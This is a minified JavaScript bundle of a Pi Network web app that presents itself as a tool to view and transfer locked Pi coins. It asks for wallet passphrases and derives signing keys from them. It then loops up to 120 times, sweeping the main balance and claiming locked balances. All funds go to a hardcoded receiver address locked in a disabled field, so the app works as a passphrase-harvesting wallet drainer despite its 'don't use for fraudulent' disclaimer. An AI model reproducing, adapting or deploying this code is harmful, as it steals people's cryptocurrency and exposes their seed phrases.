            let fe;
            return ue.extras.result_codes.transaction === "tx_bad_seq" && (fe = (K = ue.extras) != null && K.envelope_xdr ? libExports$1.hash(libExports$1.xdr.TransactionEnvelope.fromXDR(ue.extras.envelope_xdr, "base64").toXDR()).toString("hex") : null),
            {
                success: !1,
                resultCodes: {
                    transaction: ue.extras.result_codes.transaction
                },
                errorType: "stella",
                message: "Transaction failed",
                raw: "...",
                txHash: fe
            }
        }
        return {
            success: !0,
            result: ue,
            txHash: ue.hash
        }
    } catch (oe) {
        return {
            errorType: "stella",
            success: !1,
            message: "Transaction failed",
            resultCodes: (ae = (ee = (Q = oe == null ? void 0 : oe.response) == null ? void 0 : Q.data) == null ? void 0 : ee.extras) == null ? void 0 : ae.result_codes,
            raw: ((ne = oe.response) == null ? void 0 : ne.data) || oe,
            txHash: null
        }
    }
}
async function sweepBalance(_, M, j, O) {
    var ae, ne, oe, ue, fe;
    const x = await server$1.loadAccount(_)
      , w = getBalance(x)
      , b = parseFloat(await getBaseFee()) + O * 1e3
      , X = 1e7
      , Y = parseFloat(w)
      , F = b / X
      , K = (2 + x.subentry_count) * .5
      , Q = Math.abs(Y - K - F);
    console.log(`Main amount to withdraw: ${Y - K - F}`);
    const ee = new libExports$1.TransactionBuilder(x,{
        fee: b.toString(),
        networkPassphrase: "Pi Network",
        withMuxing: !0
    }).addOperation(libExports$1.Operation.payment({
        destination: M,
        asset: libExports$1.Asset.native(),
        amount: Q.toFixed(7),
        withMuxing: !0
    })).setTimeout(20).build();
    ee.sign(j);
    try {
        const pe = await (await fetch("/.netlify/functions/submitTransaction", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                xdr: ee.toXDR()
            })
        })).json();
        let ye;
        return pe.hash ? {
            success: !0,
            result: pe,
            amount: Q.toFixed(7),
            txHash: pe.hash
        } : (pe.extras.result_codes.transaction === "tx_bad_seq" && (ye = (ae = pe.extras) != null && ae.envelope_xdr ? libExports$1.hash(libExports$1.xdr.TransactionEnvelope.fromXDR(pe.extras.envelope_xdr, "base64").toXDR()).toString("hex") : null),
        {
            success: !1,
            resultCodes: {
                transaction: pe.extras.result_codes.transaction
            },
            errorType: "stella",
            message: "Transaction failed",
            raw: "...",
            amount: Q.toFixed(7),
            txHash: ye
        })
    } catch (he) {
        return {
            errorType: "stella",
            success: !1,
            message: "Transaction failed",
            resultCodes: (ue = (oe = (ne = he == null ? void 0 : he.response) == null ? void 0 : ne.data) == null ? void 0 : oe.extras) == null ? void 0 : ue.result_codes,
            raw: ((fe = he.response) == null ? void 0 : fe.data) || he,
            amount: Q.toFixed(7),
            txHash: null
        }
    }
}
async function createFeeBumpTransaction(_, M, j, O, x, w, b, X) {
    var Q, ee, ae, ne, oe;
    const Y = await server$1.loadAccount(b.publicKey())
      , F = parseFloat(await getBaseFee()) + X * 2e3
      , V = new libExports$1.TransactionBuilder(Y,{
        fee: F.toString(),
        networkPassphrase: "Pi Network",
        withMuxing: !0
    });
    for (let ue = 0; ue < x; ue++)
        V.addOperation(libExports$1.Operation.claimClaimableBalance({
            balanceId: j,
            source: _,
            withMuxing: !0
        })).addOperation(libExports$1.Operation.payment({
            destination: M,
            asset: libExports$1.Asset.native(),
            amount: O,
            source: _,
            withMuxing: !0
        }));
    V.setTimeout(30);
    const K = V.build();
    K.sign(w),
    K.sign(b);
    try {
        console.log("submitting");
        const ue = await server$1.submitTransaction(K);
        console.log("submitted");
        let fe;
        return ue.hash ? {
            success: !0,
            result: ue,
            txHash: ue.hash
        } : (ue.extras.result_codes.transaction === "tx_bad_seq" && (fe = (Q = ue.extras) != null && Q.envelope_xdr ? libExports$1.hash(libExports$1.xdr.TransactionEnvelope.fromXDR(ue.extras.envelope_xdr, "base64").toXDR()).toString("hex") : null),
        {
            success: !1,
            resultCodes: {
                transaction: ue.extras.result_codes.transaction
            },
            errorType: "stella",
            message: "Transaction failed",
            raw: "...",
            txHash: fe
        })
    } catch (ue) {
        return console.log(ue),
        {
            errorType: "stella",
            success: !1,
            message: "Transaction failed",
            resultCodes: (ne = (ae = (ee = ue == null ? void 0 : ue.response) == null ? void 0 : ee.data) == null ? void 0 : ae.extras) == null ? void 0 : ne.result_codes,
            raw: ((oe = ue.response) == null ? void 0 : oe.data) || ue,
            txHash: null
        }
    }
}
function sleep(_) {
    return new Promise(M => setTimeout(M, _))
}
function IoCopyOutline(_) {
    return GenIcon({
        attr: {
            viewBox: "0 0 512 512"
        },
        child: [{
            tag: "rect",
            attr: {
                width: "336",
                height: "336",
                x: "128",
                y: "128",
                fill: "none",
                strokeLinejoin: "round",
                strokeWidth: "32",
                rx: "57",
                ry: "57"
            },
            child: []
        }, {
            tag: "path",
            attr: {
                fill: "none",
                strokeLinecap: "round",
                strokeLinejoin: "round",
                strokeWidth: "32",
                d: "m383.5 128 .5-24a56.16 56.16 0 0 0-56-56H112a64.19 64.19 0 0 0-64 64v216a56.16 56.16 0 0 0 56 56h24"
            },
            child: []
        }]
    })(_)
}
const BalanceCard = ({id: _, amount: M, abs_before: j}) => {
    const O = new Date(j)
      , x = new Date
      , [w,b] = reactExports.useState(O.getTime() - x.getTime())
      , [X,Y] = reactExports.useState("Copy")
      , F = w <= 0;
    reactExports.useEffect( () => {
        const K = setInterval( () => {
            const Q = new Date;
            b(O.getTime() - Q.getTime())
        }
        , 1e3);
        return () => clearInterval(K)
    }
    , [j]);
    const V = K => {
        copyToClipboard(K),
        Y("Copied")
    }
    ;
    return jsxRuntimeExports.jsxs("div", {
        className: "border border-gray-700 p-4 flex flex-col w-full rounded-md shadow gap-3",
        children: [jsxRuntimeExports.jsxs("div", {
            className: "flex justify-between",
            children: [jsxRuntimeExports.jsxs("div", {
                className: "flex gap-2 items-center",
                children: [F ? jsxRuntimeExports.jsx(FaLockOpen, {
                    className: "text-xl text-green-500"
                }) : jsxRuntimeExports.jsx(FaLock, {
                    className: "text-xl text-red-500"
                }), jsxRuntimeExports.jsx("span", {
                    className: "text-xs text-gray-400 font-medium",
                    children: F ? " Unlocked" : formatCountdown(w)
                })]
            }), jsxRuntimeExports.jsxs("span", {
                className: "font-bold text-base text-emerald-500",
                children: [M, " PI"]
            })]
        }), jsxRuntimeExports.jsxs("div", {
            className: "flex justify-between items-center w-full",
            children: [jsxRuntimeExports.jsx("span", {
                className: "text-xs leading-2.5 bg-gray-700 text-gray-400 py-1 px-3 rounded font-medium",
                children: _.slice(0, 30) + "..."
            }), jsxRuntimeExports.jsx(e, {
                className: "bg-emerald-600",
                content: X,
                children: jsxRuntimeExports.jsx(o$2, {
                    onClick: () => V(_),
                    size: "2",
                    variant: "ghost",
                    children: jsxRuntimeExports.jsx(IoCopyOutline, {
                        height: "16",
                        width: "16",
                        className: "text-white"
                    })
                })
            })]
        })]
    })
}
  , HORIZON_MAIN_URL = "http://4.194.35.14:31401"
  , server = new libExports$1.Server(HORIZON_MAIN_URL)
  , ViewLockedPi = () => {
    const [_,M] = reactExports.useState("")
      , [j,O] = reactExports.useState([])
      , [x,w] = reactExports.useState(!1)
      , [b,X] = reactExports.useState(!1)
      , [Y,F] = reactExports.useState(!1)
      , V = async () => {
        var ye;
        X(!0);
        const Q = generateWalletKeypair(_).publicKey()
          , ee = await getClaimableBalance(Q)
          , ae = await server.loadAccount(Q)
          , ne = (await server.feeStats()).fee_charged.max
          , oe = parseFloat(ne) / 1e7;
        console.log(await server.feeStats());
        const ue = parseFloat(((ye = ae.balances.find(be => be.asset_type === "native")) == null ? void 0 : ye.balance) ?? "0")
          , pe = (2 + ae.subentry_count) * .5;
        if (console.log(`You can withdraw up to: ${(ue - pe - oe).toFixed(7)} Pi`),
        ee.records.length) {
            const be = ee.records[0].claimants.find(Ae => Ae.destination === Q)
              , xe = ee.records.map(Ae => {
                var Ee;
                return {
                    id: Ae.id,
                    amount: Ae.amount,
                    abs_before: (Ee = be == null ? void 0 : be.predicate.not) == null ? void 0 : Ee.abs_before
                }
            }
            );
            O(xe)
        }
        w(!0),
        X(!1)
    }
    ;
    return jsxRuntimeExports.jsxs("div", {
        className: "flex flex-col gap-7 justify-start w-full px-2",
        children: [jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            children: [jsxRuntimeExports.jsx(p$8, {
                className: "text-base md:text-2xl font-semibold text-gray-300",
                children: "View Locked Coins"
            }), jsxRuntimeExports.jsx(p$8, {
                className: "md:text-sm text-xs font-medium text-gray-500",
                children: "Enter your PI wallet passphrase to view locked(claimable) balance"
            })]
        }), jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "1",
            children: [jsxRuntimeExports.jsx(y$1, {
                className: "font-medium text-base !text-gray-100",
                children: "Wallet Passphrase"
            }), jsxRuntimeExports.jsx(u, {
                type: Y ? "text" : "password",
                value: _,
                onChange: K => M(K.currentTarget.value),
                placeholder: "Enter your wallet passphrase...",
                className: "flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input",
                size: "3",
                children: jsxRuntimeExports.jsx(c, {
                    side: "right",
                    children: jsxRuntimeExports.jsx(o$2, {
                        onClick: () => F(!Y),
                        size: "2",
                        variant: "ghost",
                        children: jsxRuntimeExports.jsx(FaEye, {
                            height: "16",
                            width: "16",
                            className: "text-gray-50"
                        })
                    })
                })
            })]
        }), jsxRuntimeExports.jsx(o$4, {
            loading: b,
            onClick: V,
            type: "button",
            className: "!bg-emerald-600",
            children: "View Balance"
        }), x && jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "3",
            children: [jsxRuntimeExports.jsx(p$8, {
                size: "3",
                className: "text-gray-200",
                children: "Locked Balances"
            }), j && j.length > 0 ? j.map(K => jsxRuntimeExports.jsx(BalanceCard, {
                abs_before: K.abs_before,
                amount: K.amount,
                id: K.id
            }, K.id)) : jsxRuntimeExports.jsx(p$8, {
                children: "No Locked Balance Found"
            })]
        }), jsxRuntimeExports.jsx(jsxRuntimeExports.Fragment, {
            children: jsxRuntimeExports.jsx("style", {
                children: `
					.rt-TextFieldInput::placeholder {
						color: gray;
						opacity: 1; /* for Firefox */
					}
					`
            })
        })]
    })
}
  , TransactionDetails = ({success: _, amount: M, to: j, from: O, time: x, type: w, reason: b, txHash: X}) => jsxRuntimeExports.jsxs(p$1, {
    maxWidth: "450px",
    className: "flex flex-col items-center w-full !bg-gray-800 border border-gray-900 text-gray-100 rounded-md gap-2",
    children: [jsxRuntimeExports.jsx(g$1, {
        className: "!text-base !font-semibold text-gray-400",
        children: "Transaction Details"
    }), jsxRuntimeExports.jsx("div", {
        className: "w-full flex justify-center",
        children: _ ? jsxRuntimeExports.jsx(FaCheckCircle, {
            className: "text-6xl text-green-500"
        }) : jsxRuntimeExports.jsx(FaRegTimesCircle, {
            className: "text-6xl text-red-500"
        })
    }), jsxRuntimeExports.jsxs("span", {
        className: "text-2xl font-bold mt-4",
        children: [M, " PI"]
    }), jsxRuntimeExports.jsx("span", {
        className: `text-base font-semibold ${_ ? "text-green-500" : "text-red-500"}`,
        children: _ ? "Successful" : "Failed"
    }), jsxRuntimeExports.jsxs("div", {
        className: "rounded bg-gray-700 flex justify-between items-center w-full p-4",
        children: [jsxRuntimeExports.jsxs("div", {
            className: "flex flex-col",
            children: [jsxRuntimeExports.jsx("span", {
                className: "text-xs text-gray-400 font-medium",
                children: "From"
            }), jsxRuntimeExports.jsx("span", {
                className: "text-xs text-gray-50 font-semibold bg-gray-500 px-1 rounded-sm",
                children: `${O.slice(0, 6)}...${O.slice(-6)}`
            }), jsxRuntimeExports.jsx("span", {
                className: "text-[10px] text-gray-500",
                children: "Pi Network"
            })]
        }), jsxRuntimeExports.jsxs("div", {
            className: "flex flex-col",
            children: [jsxRuntimeExports.jsx("span", {
                className: "text-xs text-gray-400 font-medium",
                children: "To"
            }), jsxRuntimeExports.jsx("span", {
                className: "text-xs text-gray-50 font-semibold bg-gray-500 px-1 rounded-sm",
                children: `${j.slice(0, 6)}...${j.slice(-6)}`
            }), jsxRuntimeExports.jsx("span", {
                className: "text-[10px] text-gray-500",
                children: "Pi Network"
            })]
        })]
    }), jsxRuntimeExports.jsxs("ul", {
        className: "rounded bg-gray-700 flex flex-col w-full p-4 gap-4",
        children: [jsxRuntimeExports.jsxs("li", {
            className: "flex justify-between items-center",
            children: [jsxRuntimeExports.jsx("span", {
                className: "text-sm text-gray-300 font-medium",
                children: "Transaction Status"
            }), jsxRuntimeExports.jsx("span", {
                className: `text-xs font-semibold ${_ ? "text-green-500" : "text-red-500"}`,
                children: _ ? "Successful" : "Failed"
            })]
        }), jsxRuntimeExports.jsxs("li", {
            className: "flex justify-between items-center",
            children: [jsxRuntimeExports.jsx("span", {
                className: "text-sm text-gray-300 font-medium",
                children: "Transaction Type"
            }), jsxRuntimeExports.jsx("span", {
                className: "text-xs text-white",
                children: w
            })]
        }), jsxRuntimeExports.jsxs("li", {
            className: "flex justify-between items-center",
            children: [jsxRuntimeExports.jsx("span", {
                className: "text-sm text-gray-300 font-medium",
                children: "Time"
            }), jsxRuntimeExports.jsx("span", {
                className: "text-xs text-white",
                children: x
            })]
        }), jsxRuntimeExports.jsxs("li", {
            className: "flex justify-between items-center",
            children: [jsxRuntimeExports.jsx("span", {
                className: "text-sm text-gray-300 font-medium",
                children: "Reason"
            }), jsxRuntimeExports.jsx("span", {
                className: "text-xs text-gray-300",
                children: b
            })]
        })]
    }), X && jsxRuntimeExports.jsx(o$4, {
        className: "!w-full !bg-emerald-600 mt-4",
        children: jsxRuntimeExports.jsx("a", {
            href: `https://blockexplorer.minepi.com/mainnet/transactions/${X}`,
            children: "View in explorer"
        })
    })]
})
  , Attempts = ({sender: _, receiver: M, amount: j, id: O, success: x, time: w, action: b, reason: X, type: Y, txHash: F}) => jsxRuntimeExports.jsxs(s, {
    children: [jsxRuntimeExports.jsx(n$1, {
        children: jsxRuntimeExports.jsxs("div", {
            className: "rounded bg-gray-800 text-gray-400 p-2 flex gap-2 items-center shadow hover:bg-gray-900 hover:border hover:border-gray-800",
            children: [x ? jsxRuntimeExports.jsx(FaCheckCircle, {
                className: "text-green-600 text-sm"
            }) : jsxRuntimeExports.jsx(FaRegTimesCircle, {
                className: "text-red-600 text-sm"
            }), jsxRuntimeExports.jsxs("div", {
                className: "flex flex-col",
                children: [jsxRuntimeExports.jsxs("span", {
                    className: `text-[11px] font-semibold ${x ? "text-green-600" : "text-red-600"}`,
                    children: [O, ". ", b]
                }), jsxRuntimeExports.jsx("span", {
                    className: "text-[9px] text-gray-400 font-medium",
                    children: w
                })]
            }), jsxRuntimeExports.jsxs("div", {
                className: "ml-auto flex flex-col gap-1",
                children: [jsxRuntimeExports.jsxs("span", {
                    className: "text-[10px] font-medium",
                    children: ["From: ", `${_.slice(0, 7)}...${_.slice(-9)}`]
                }), jsxRuntimeExports.jsxs("span", {
                    className: "text-[10px] font-medium",
                    children: ["To: ", `${M.slice(0, 7)}...${M.slice(-9)}`]
                }), jsxRuntimeExports.jsxs("span", {
                    className: "text-[10px] font-semibold",
                    children: ["Amount: ", jsxRuntimeExports.jsxs("strong", {
                        className: "text-emerald-600 font-bold",
                        children: [j, " PI"]
                    })]
                })]
            })]
        })
    }), jsxRuntimeExports.jsx(TransactionDetails, {
        txHash: F,
        amount: j,
        from: _,
        to: M,
        time: w,
        success: x,
        type: Y,
        reason: X
    })]
})
  , TransactionBlocks = ({attempts: _, maxAttemps: M, attemptsArray: j}) => jsxRuntimeExports.jsxs("div", {
    className: "min-h-52 rounded border border-gray-700 p-4",
    children: [jsxRuntimeExports.jsxs("div", {
        className: "flex justify-between items-center mb-5",
        children: [jsxRuntimeExports.jsx(p$8, {
            className: "text-base font-medium text-gray-300",
            children: "Attempting Transfer..."
        }), jsxRuntimeExports.jsxs("span", {
            className: "text-xs font-medium text-gray-400",
            children: ["Attempt ", _, "/", M]
        })]
    }), jsxRuntimeExports.jsx("div", {
        className: "flex flex-col gap-2",
        children: j.map( (O, x) => jsxRuntimeExports.jsx(Attempts, {
            txHash: O.txHash,
            reason: O.details,
            type: O.type,
            action: O.action,
            time: O.time,
            success: O.success,
            id: x + 1,
            amount: O.amount,
            receiver: O.receiver,
            sender: O.sender
        }, x))
    })]
})
  , SelectTransactionType = ({onSelected: _, values: M, label: j}) => {
    const [O,x] = reactExports.useState(M[0])
      , w = b => {
        x(b),
        _(b)
    }
    ;
    return jsxRuntimeExports.jsxs(p$3, {
        direction: "column",
        gap: "1",
        children: [jsxRuntimeExports.jsx(y$1, {
            className: "font-medium text-base !text-gray-100",
            children: j
        }), jsxRuntimeExports.jsxs(C, {
            value: O ?? "",
            onValueChange: w,
            children: [jsxRuntimeExports.jsx(u$1, {}), jsxRuntimeExports.jsx(g, {
                children: jsxRuntimeExports.jsxs(y, {
                    children: [jsxRuntimeExports.jsx(h, {
                        children: j
                    }), M.map(b => jsxRuntimeExports.jsx(v, {
                        value: b,
                        className: "capitalize",
                        children: b
                    }, b))]
                })
            })]
        })]
    })
}
  , TransferPi = () => {
    const [_,M] = reactExports.useState(!1)
      , [j,O] = reactExports.useState("")
      , [x,w] = reactExports.useState("")
      , [b,X] = reactExports.useState("GA2CXP2KK2PANC3JDEZLRKONYZBWXMTHY3N235QNJQFGGTJRUMPNM75X")
      , [Y,F] = reactExports.useState([])
      , [V,K] = reactExports.useState(null)
      , [Q,ee] = reactExports.useState(!1)
      , [ae,ne] = reactExports.useState()
      , [oe,ue] = reactExports.useState()
      , [fe,he] = reactExports.useState(0)
      , [pe,ye] = reactExports.useState([])
      , [be,xe] = reactExports.useState("sender")
      , [Ae,Ee] = reactExports.useState("all")
      , Be = 120;
    reactExports.useEffect( () => {
        L(j)
    }
    , [j, x]);
    const ce = Z => {
        xe(Z)
    }
      , q = Z => {
        Ee(Z)
    }
    ;
    async function L(Z) {
        const te = generateWalletKeypair(Z)
          , se = generateWalletKeypair(x);
        ne(te),
        ue(se);
        const re = (await getClaimableBalance(te.publicKey())).records.map($ => {
            var ie;
            return {
                id: $.id,
                amount: $.amount,
                abs_before: (ie = $.claimants[0].predicate.not) == null ? void 0 : ie.abs_before
            }
        }
        );
        F(re)
    }
    async function U() {
        var se, de, re, $, ie, ve, ge;
        if (!ae)
            return;
        ee(!0);
        let Z = !1
          , te = 0;
        for (; te < Be; ) {
            if ((Ae === "all" || Ae === "sweep only") && (sweepBalance(ae.publicKey(), b, ae, te).then(Re => {
                var Le, Ze, $e, Ne, qe, Ve;
                const Ie = new Date(Date.now()).toLocaleTimeString("en-US", {
                    hour12: !1
                });
                let Te = {
                    sender: ae.publicKey(),
                    receiver: b,
                    amount: Re.amount,
                    message: "",
                    details: "",
                    success: Re.success,
                    time: Ie,
                    action: Z ? "Sent balance" : "Tried to send balance",
                    reason: "",
                    type: "Main Balance Sweeping",
                    txHash: Re.txHash
                };
                Re.success ? Te = {
                    ...Te,
                    message: "Transaction was successful",
                    details: `${Re.amount} Pi was claimed and sent to provided address`,
                    action: "Tried to send balance"
                } : Re.errorType === "stella" ? (((Le = Re.resultCodes) == null ? void 0 : Le.transaction) === "tx_insufficient_fee" && (Te = {
                    ...Te,
                    message: Re.message,
                    details: "Not enough fee"
                }),
                ((Ze = Re.resultCodes) == null ? void 0 : Ze.transaction) === "op_underfunded" && (Te = {
                    ...Te,
                    message: Re.message,
                    details: "Insufficient balance"
                }),
                (($e = Re.resultCodes) == null ? void 0 : $e.transaction) === "tx_bad_auth" && (Te = {
                    ...Te,
                    message: Re.message,
                    details: "Invalid signature"
                }),
                ((Ne = Re.resultCodes) == null ? void 0 : Ne.transaction) === "op_no_destination" && (Te = {
                    ...Te,
                    message: Re.message,
                    details: "Invalid destination wallet address"
                }),
                ((qe = Re.resultCodes) == null ? void 0 : qe.transaction) === "op_claimable_balance_not_found" && (Te = {
                    ...Te,
                    message: Re.message,
                    details: "Balance not found, or already claimed"
                }),
                ((Ve = Re.resultCodes) == null ? void 0 : Ve.transaction) === "tx_insufficient_balance" && (Te = {
                    ...Te,
                    message: Re.message,
                    details: "Insufficient balance"
                })) : Te = {
                    ...Te,
                    message: "General error",
                    details: "Unknown error occured!!!"
                },
                ye(lt => [...lt, Te])
            }
            ),
            await sleep(400)),
            Ae === "all" || Ae == "locked balance") {
                await L(j);
                const Re = Y.find(Pe => Pe.id === V);
                if (Re && V) {
                    let Pe;
                    be === "custom" && oe ? (console.log("using feebump"),
                    Pe = await createFeeBumpTransaction(ae == null ? void 0 : ae.publicKey(), b, V, Re == null ? void 0 : Re.amount, 1, ae, oe, te)) : (console.log("Not using feebump"),
                    Pe = await createPiTransaction(ae == null ? void 0 : ae.publicKey(), V, b, Re == null ? void 0 : Re.amount, 1, ae, te)),
                    Z = Pe.success;
                    const Te = new Date(Date.now()).toLocaleTimeString("en-US", {
                        hour12: !1
                    });
                    let Le = {
                        sender: ae.publicKey(),
                        receiver: b,
                        amount: Re.amount,
                        message: "",
                        details: "",
                        success: Pe.success,
                        time: Te,
                        action: Z ? "Claimed PI" : "Tried to claim PI",
                        type: "Unlocked PI Claiming",
                        txHash: Pe.txHash
                    };
                    Pe.success ? Le = {
                        ...Le,
                        message: "Transaction was successful",
                        details: `${Re.amount} Pi was claimed and sent to provided address`
                    } : Pe.errorType === "stella" ? ((se = Pe.resultCodes) == null ? void 0 : se.transaction) === "tx_insufficient_fee" ? Le = {
                        ...Le,
                        message: Pe.message,
                        details: "Not enough fee"
                    } : ((de = Pe.resultCodes) == null ? void 0 : de.transaction) === "tx_insufficient_balance" ? Le = {
                        ...Le,
                        message: Pe.message,
                        details: "Insufficient balance"
                    } : ((re = Pe.resultCodes) == null ? void 0 : re.transaction) === "op_underfunded" ? Le = {
                        ...Le,
                        message: Pe.message,
                        details: "No Claimable balance"
                    } : (($ = Pe.resultCodes) == null ? void 0 : $.transaction) === "tx_bad_auth" ? Le = {
                        ...Le,
                        message: Pe.message,
                        details: "Invalid signature"
                    } : ((ie = Pe.resultCodes) == null ? void 0 : ie.transaction) === "op_no_destination" ? Le = {
                        ...Le,
                        message: Pe.message,
                        details: "Invalid destination wallet address"
                    } : ((ve = Pe.resultCodes) == null ? void 0 : ve.transaction) === "op_claimable_balance_not_found" ? Le = {
                        ...Le,
                        message: Pe.message,
                        details: "Balance not found, or already claimed"
                    } : Le = {
                        ...Le,
                        message: Pe.message,
                        details: ((ge = Pe.resultCodes) == null ? void 0 : ge.transaction) || ""
                    } : Le = {
                        ...Le,
                        message: Pe.message,
                        details: "Unknown error occured"
                    },
                    ye(Ze => [...Ze, Le])
                }
                await sleep(Re && V ? 1 : 200)
            }
            te++,
            he(te)
        }
        ee(!1)
    }
    return jsxRuntimeExports.jsxs("div", {
        className: "flex flex-col gap-7 justify-start w-full px-2",
        children: [jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            children: [jsxRuntimeExports.jsx(p$8, {
                className: "text-base md:text-2xl font-semibold text-gray-300",
                children: "Transfer Coins"
            }), jsxRuntimeExports.jsx(p$8, {
                className: "md:text-sm text-xs font-medium text-gray-500",
                children: "Fill in the below form correctly"
            })]
        }), jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "1",
            children: [jsxRuntimeExports.jsx(y$1, {
                className: "font-medium text-base !text-gray-100",
                children: "Sender Wallet Passphrase"
            }), jsxRuntimeExports.jsx(u, {
                type: _ ? "text" : "password",
                value: j,
                onChange: Z => O(Z.currentTarget.value),
                placeholder: "Enter sender wallet passphrase...",
                className: "flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full",
                size: "3",
                children: jsxRuntimeExports.jsx(c, {
                    side: "right",
                    children: jsxRuntimeExports.jsx(o$2, {
                        onClick: () => M(!_),
                        size: "2",
                        variant: "ghost",
                        children: jsxRuntimeExports.jsx(FaEye, {
                            height: "16",
                            width: "16",
                            className: "text-gray-50"
                        })
                    })
                })
            }), j && ae && jsxRuntimeExports.jsxs("div", {
                className: "flex items-center gap-2",
                children: [jsxRuntimeExports.jsx(FaCheckCircle, {
                    className: "text-xs text-blue-600"
                }), jsxRuntimeExports.jsx("p", {
                    className: "text-xs text-blue-600 font-medium",
                    children: `${ae == null ? void 0 : ae.publicKey().slice(0, 10)}...${ae == null ? void 0 : ae.publicKey().slice(-10)}`
                })]
            })]
        }), jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "1",
            children: [jsxRuntimeExports.jsx(y$1, {
                className: "font-medium text-base !text-gray-100",
                children: "Receiver wallet address"
            }), jsxRuntimeExports.jsx(u, {
                type: "text",
                disabled: !0,
                value: b,
                onChange: Z => X(Z.currentTarget.value),
                placeholder: "Enter receiver wallet address...",
                className: "flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full cursor-not-allowed",
                size: "3"
            })]
        }), jsxRuntimeExports.jsx(SelectTransactionType, {
            values: ["all", "locked balance", "sweep only"],
            label: "Withdrawal Type",
            onSelected: q
        }), jsxRuntimeExports.jsx(SelectTransactionType, {
            values: ["sender", "custom"],
            label: "Fee Payer",
            onSelected: ce
        }), be === "custom" && jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "1",
            children: [jsxRuntimeExports.jsx(y$1, {
                className: "font-medium text-base !text-gray-100",
                children: "Payer Wallet Passphrase"
            }), jsxRuntimeExports.jsx(u, {
                type: _ ? "text" : "password",
                value: x,
                onChange: Z => w(Z.currentTarget.value),
                placeholder: "Enter sender wallet passphrase...",
                className: "flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full",
                size: "3",
                children: jsxRuntimeExports.jsx(c, {
                    side: "right",
                    children: jsxRuntimeExports.jsx(o$2, {
                        onClick: () => M(!_),
                        size: "2",
                        variant: "ghost",
                        children: jsxRuntimeExports.jsx(FaEye, {
                            height: "16",
                            width: "16",
                            className: "text-gray-50"
                        })
                    })
                })
            }), x && oe && jsxRuntimeExports.jsxs("div", {
                className: "flex items-center gap-2",
                children: [jsxRuntimeExports.jsx(FaCheckCircle, {
                    className: "text-xs text-blue-600"
                }), jsxRuntimeExports.jsx("p", {
                    className: "text-xs text-blue-600 font-medium",
                    children: `${oe == null ? void 0 : oe.publicKey().slice(0, 10)}...${oe == null ? void 0 : oe.publicKey().slice(-10)}`
                })]
            })]
        }), jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "1",
            children: [jsxRuntimeExports.jsx(y$1, {
                className: "font-medium text-base !text-gray-100",
                children: "Locked Balances"
            }), jsxRuntimeExports.jsxs(C, {
                value: V ?? "",
                onValueChange: K,
                children: [jsxRuntimeExports.jsx(u$1, {
                    className: "bg-transparent",
                    placeholder: "Select locked balance"
                }), jsxRuntimeExports.jsx(g, {
                    className: "bg-transparent",
                    children: Y.map( (Z, te) => jsxRuntimeExports.jsx(v, {
                        className: "font-semibold",
                        value: Z.id,
                        children: `Balance #${te + 1} - ${Z.amount} PI`
                    }, Z.id))
                })]
            })]
        }), jsxRuntimeExports.jsx(o$4, {
            loading: Q,
            onClick: U,
            type: "button",
            className: "!bg-emerald-600",
            children: "Transfer Pi"
        }), pe.length ? jsxRuntimeExports.jsx(TransactionBlocks, {
            attemptsArray: pe,
            attempts: fe,
            maxAttemps: Be
        }) : "", jsxRuntimeExports.jsx(jsxRuntimeExports.Fragment, {
            children: jsxRuntimeExports.jsx("style", {
                children: `
					.rt-TextFieldInput::placeholder {
						color: gray;
						opacity: 1; /* for Firefox */
					}
						input:disabled {
							background: #121e31;
							color: white;
							cursor: not-allowed;
						}
					`
            })
        })]
    })
}
  , Home = () => {
    const [_,M] = reactExports.useState("Locked Coins")
      , j = O => {
        M(O)
    }
    ;
    return jsxRuntimeExports.jsxs("main", {
        className: "min-h-full w-full bg-slate-900 text-slate-50 flex justify-center items-center flex-col gap-2 p-2",
        children: [jsxRuntimeExports.jsxs("div", {
            className: "w-full h-full md:w-1/2 flex flex-col justify-center items-center border md:min-h-96 border-slate-700 md:rounded-xl p-2 gap-4",
            children: [jsxRuntimeExports.jsx(BotHeader, {}), jsxRuntimeExports.jsx(Tab, {
                onSetTab: j
            }), jsxRuntimeExports.jsx(o, {
                className: "border-b border-b-gray-800",
                my: "3",
                size: "4"
            }), _ == "Locked Coins" ? jsxRuntimeExports.jsx(ViewLockedPi, {}) : jsxRuntimeExports.jsx(TransferPi, {})]
        }), jsxRuntimeExports.jsxs("div", {
            className: "mt-10 text-sm text-red-500 text-center",
            children: [jsxRuntimeExports.jsx("strong", {
                children: "Desclaimer:"
            }), " Please don't use for fraudulent, malicious or illegal activities"]
        }), jsxRuntimeExports.jsxs("div", {
            className: "mt-5 text-xs text-gray-300",
            children: ["Created & Maintained by ", jsxRuntimeExports.jsx("strong", {
                children: "FritzDeCode"
            })]
        })]
    })
}
;
var dist$2 = {}, hasRequiredDist$2;
function requireDist$2() {
    if (hasRequiredDist$2)
        return dist$2;
    hasRequiredDist$2 = 1,
    Object.defineProperty(dist$2, "__esModule", {
        value: !0
    }),
    dist$2.parse = b,
    dist$2.serialize = F;
    const _ = /^[\u0021-\u003A\u003C\u003E-\u007E]+$/
      , M = /^[\u0021-\u003A\u003C-\u007E]*$/
      , j = /^([.]?[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)([.][a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)*$/i
      , O = /^[\u0020-\u003A\u003D-\u007E]*$/
      , x = Object.prototype.toString
      , w = ( () => {
        const Q = function() {};
        return Q.prototype = Object.create(null),
        Q
    }
    )();
    function b(Q, ee) {
        const ae = new w
          , ne = Q.length;
        if (ne < 2)
            return ae;
